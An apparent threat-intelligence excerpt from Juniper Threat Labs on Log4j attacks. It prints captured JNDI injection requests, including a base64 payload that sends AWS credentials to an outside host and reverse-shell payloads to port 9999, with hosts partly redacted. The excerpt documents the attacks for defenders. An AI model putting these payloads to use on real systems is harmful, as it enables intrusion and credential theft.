@@ -1,0 +1,10 @@
+Juniper Threat Labs compiled a list of the payloads from log4j attacks we have seen as of 12/16.
+Most of the payloads install malware such as Muhstik, Kinsing, Mirai and Cryptominers.
+We have also seen installation of a file infector malware.
+We have also observed malicious attacks that open a reverse shell on the target, as well as attacks that attempt to dump AWS credentials.
+There are also a large number of benign scans coming from test or security organizations.
+To be able to have a better understanding of the attacks, we will briefly detail how this specific attack works.
+The majority of the attacks have the strings “Basic/Command/Base64/ ” or “ Basic/ReverseShell”.
+GET /$%7Bjndi:
+ldap://<redacted> /Basic/Command/Base64 / Y3VybCAtZCAiJChjYXQgfi8uYXdzL2NyZWRlbnRpYWxzKSIgaHR0cHM6Ly9jNnRkNW1lMnZ0Y<redacted> %7D HTTP/1.1 Host:<redacted>
+User-Agent: ${jndi:ldap://<redacted> /Basic/Command/Base64 / Y3VybCAtZCAiJChjYXQgfi8uYXdzL2NyZWRlbnRpYWxzKSIgaHR0cHM6Ly9jNnRkNW1lMnZ0YzAwMDBhcTY5MGdkcGcxNG<redacted> } GET / HTTP/1.0 User-Agent: borchuk/3.1 ${jndi:ldap://<redacted>:1389 /Basic/ReverseShell/ <redacted_ip>/9999 } Accept: */* Bearer: ${jndi:ldap://<redacted>:1389 /Basic/ReverseShell / <redacted_ip>/9999 }
